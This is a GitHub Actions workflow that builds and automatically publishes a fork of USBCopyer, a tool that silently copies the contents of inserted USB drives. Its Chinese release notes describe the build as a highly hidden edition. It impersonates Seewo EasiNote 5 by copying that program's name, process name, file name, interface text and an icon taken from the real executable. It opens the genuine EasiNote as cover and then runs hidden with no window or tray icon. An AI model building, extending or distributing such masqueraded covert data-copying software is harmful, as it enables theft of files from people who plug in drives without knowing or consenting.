name: build

on:
  workflow_dispatch:
  push:
    branches: [ master ]
  pull_request:

env:
  VERSION: 5.11-gh6

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v4

    - name: Add msbuild to PATH
      uses: microsoft/setup-msbuild@v2

    - name: Clean Release directory
      shell: pwsh
      run: |
        if (Test-Path Release) { Remove-Item -Recurse -Force Release }

    - name: Restore NuGet packages
      run: msbuild USBCopyer\USBCopyer.csproj -t:restore -p:Configuration=Release -p:Platform="Any CPU"

    - name: Build Release
      run: msbuild USBCopyer.sln -t:build -p:Configuration=Release -p:Platform="Any CPU"

    - name: Rename assets with version
      shell: pwsh
      run: |
        Get-ChildItem Release -Filter *.exe | ForEach-Object {
          $new = $_.BaseName + ".v$env:VERSION" + $_.Extension
          Move-Item $_.FullName (Join-Path $_.DirectoryName $new)
        }
        Get-ChildItem Release | Select-Object Name, Length

    - uses: actions/upload-artifact@v4
      with:
        name: EasiNote-v${{ env.VERSION }}
        path: Release/

  release:
    needs: build
    # 全自动发布：任何成功的编译（手动触发）即自动发布正式 Release
    if: github.event_name == 'workflow_dispatch' || github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
    - uses: actions/download-artifact@v4
      with:
        name: EasiNote-v${{ env.VERSION }}
        path: dist

    - name: Publish GitHub Release
      uses: softprops/action-gh-release@v2
      with:
        tag_name: v${{ env.VERSION }}
        name: EasiNote v${{ env.VERSION }}
        body: |
          EasiNote —— USBCopyer 高隐藏性定制版

          - 伪装为希沃白板5（EasiNote）：程序名 / 进程名 / exe 文件名 / 图标（提取自真实 EasiNote.exe）/ 界面文案全部一致
          - 双击（无参数）启动时，先自动打开电脑中已安装的希沃白板5（查运行进程 → 注册表 → 默认安装路径），再隐藏后台运行
          - 单实例检测改用 Mutex，与真实希沃白板进程互不干扰
          - 默认隐藏启动（无窗口、无托盘图标），仅显式 /gui 参数显示界面
          - U盘别名映射（disk_mapping.ini，与 exe 同级）、黑白名单、回调、Disks.csv 等全部功能保留

          使用：EasiNote.exe /gui 打开设置界面；默认（无参数）隐藏运行。
          版本 v${{ env.VERSION }}（跟随上游 V5.11，本 fork 定制第 5 版）
        files: dist/*
